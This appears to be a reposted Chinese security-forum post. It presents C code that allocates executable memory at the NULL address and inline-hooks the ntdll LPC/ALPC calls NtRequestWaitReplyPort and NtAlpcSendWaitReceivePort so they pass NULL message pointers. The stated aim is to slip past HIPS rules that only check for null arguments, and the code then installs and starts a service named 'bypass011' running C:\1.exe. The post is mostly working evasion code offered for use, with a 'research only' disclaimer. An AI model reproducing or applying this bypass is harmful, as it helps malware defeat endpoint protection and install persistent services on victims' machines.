
# 圣诞礼物：妙用 0 地址~

> 原文：[`www.pediy.com/kssd/pediy12/144611.html`](https://www.pediy.com/kssd/pediy12/144611.html)

`NULL` 不是一个无效的参数，但是多少写规则过滤的人，都上来一句`if(xxx){}`~~

这让人情何以堪啊~直接利用`NULL`做地址传参的话，就啊哈啊哈~~

上代码，这个方法估计也要被和谐了~

代码:

```
typedef struct _CLIENT_ID {
  HANDLE UniqueProcess;
  HANDLE UniqueThread;
} CLIENT_ID;
typedef CLIENT_ID *PCLIENT_ID;
#define LPC_CLIENT_ID CLIENT_ID
#define LPC_SIZE_T SIZE_T
typedef NTSTATUS (WINAPI *PNTALLOCATE)( IN HANDLE ProcessHandle,
  IN OUT PVOID *BaseAddress,
  IN ULONG ZeroBits,
  IN OUT PULONG RegionSize,
  IN ULONG AllocationType,
  IN ULONG Protect );
typedef struct _PORT_MESSAGE {
  union {
    struct {
      WORD DataLength;
      WORD TotalLength;
    } s1;
    ULONG Length;
  } u1;
  union {
    struct {
      WORD Type;
      WORD DataInfoOffset;
    } s2;
    ULONG ZeroInit;
  } u2;
  union {
    LPC_CLIENT_ID ClientId;
    double DoNotUseThisField;       // Force quadword alignment
  };
  ULONG MessageId;
  union {
    LPC_SIZE_T ClientViewSize;        // Only valid on LPC_CONNECTION_REQUEST message
    ULONG CallbackId;                // Only valid on LPC_REQUEST message
  };
  //  UCHAR Data[];
} PORT_MESSAGE, *PPORT_MESSAGE;
typedef NTSTATUS (__stdcall *T_NtRequestWaitReplyPort)(
   HANDLE PortHandle,
   PPORT_MESSAGE RequestMessage,
   PPORT_MESSAGE ReplyMessage
  );
typedef NTSTATUS (__stdcall *T_NtAlpcSendWaitReceivePort)(IN HANDLE PortHandle,
   DWORD SendFlags,
   PPORT_MESSAGE SendMessage ,
   PVOID InMessageBuffer ,
   PPORT_MESSAGE ReceiveBuffer ,
   PULONG ReceiveBufferSize ,
   PVOID OutMessageBuffer ,
  PLARGE_INTEGER Timeout);
T_NtAlpcSendWaitReceivePort OldCallX;
T_NtRequestWaitReplyPort OldCall;
NTSTATUS __stdcall OnNtRequestWaitReplyPort (
  HANDLE PortHandle,
  PPORT_MESSAGE RequestMessage,
  PPORT_MESSAGE ReplyMessage
  )
{
  //设置
  NTSTATUS ns =0;
  _tprintf(_T("hhh \r\n"));
  RtlCopyMemory(NULL,RequestMessage,RequestMessage->u1.s1.TotalLength);
  ns = ((T_NtRequestWaitReplyPort)OldCall)(PortHandle,NULL,ReplyMessage);
  RtlZeroMemory(NULL,0x1000);
  return ns;
}
NTSTATUS __stdcall OnNtAlpcSendWaitReceivePort(IN HANDLE PortHandle,
  DWORD SendFlags,
  PPORT_MESSAGE SendMessage ,
  PVOID InMessageBuffer ,
  PPORT_MESSAGE ReceiveBuffer ,
  PULONG ReceiveBufferSize ,
  PVOID OutMessageBuffer ,
  PLARGE_INTEGER Timeout)
{
  NTSTATUS ns =0;
  _tprintf(_T("hhh2 \r\n"));
  if (SendMessage)
  {
    RtlCopyMemory(NULL,SendMessage,SendMessage->u1.s1.TotalLength);
  }
  ns = ((T_NtAlpcSendWaitReceivePort)OldCallX)(PortHandle,SendFlags,NULL,InMessageBuffer,ReceiveBuffer,ReceiveBufferSize,OutMessageBuffer,Timeout);
  return ns;
}
void InitNullAddress()
{
  PNTALLOCATE NtAllocateVirtualMemory;
  ULONG addr = 2;
  DWORD dwShellSize=0x1000;
  NtAllocateVirtualMemory = (PNTALLOCATE) GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtAllocateVirtualMemory");

  if( !NtAllocateVirtualMemory )
  {
    _tprintf(_T("no ntdll api!\r\n"));
    ExitProcess(-1);
  }

  NtAllocateVirtualMemory( (HANDLE)-1,
    (PVOID *)&addr,
    0,
    &dwShellSize,
    MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN,
    PAGE_EXECUTE_READWRITE );

  _tprintf(_T("Allocate %08x\r\n"),addr);
  if( (ULONG_PTR)addr )
  {
    _tprintf(_T("\r\n[+] Error Allocating memory\r\n"));
    ExitProcess(-1);
  }
}
int _tmain(int argc, _TCHAR* argv[])
{
  T_NtRequestWaitReplyPort Func1;
  T_NtAlpcSendWaitReceivePort Func2;
  //申请出 0 地址 0x1000 大的块，哦哦哦
  InitNullAddress();
  RtlZeroMemory(NULL,0x1000);
  _tprintf(_T("NULL %08x\r\n"),*(DWORD *)NULL);
  //hook 关键某 api
  //XX
  Func1 = (T_NtRequestWaitReplyPort) GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtRequestWaitReplyPort");
  if (Func1)
  {
    InlineHook((void *)Func1,(void *)OnNtRequestWaitReplyPort,(void **)&OldCall);
  }
  Func2 = (T_NtAlpcSendWaitReceivePort)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtAlpcSendWaitReceivePort");
  if (Func2)
  {
    InlineHook((void *)Func2,(void *)OnNtAlpcSendWaitReceivePort,(void **)&OldCallX);
  }
  //产生那个调用！
  //创建服务代码略
  InstallServiceEx(L"bypass011",L"Test3",L"Test3",L"C:\\1.exe",0x3);
  StartServiceEx(L"bypass011");
  return 0;
}
```

附件里是完整版代码~

`bypasships_NULLAddr.rar`

严重声明：本帖给出的代码仅供研究学习之用，如果用在他途，各种后果与本人无关。

欢迎交流，QQ 群：`171797360`
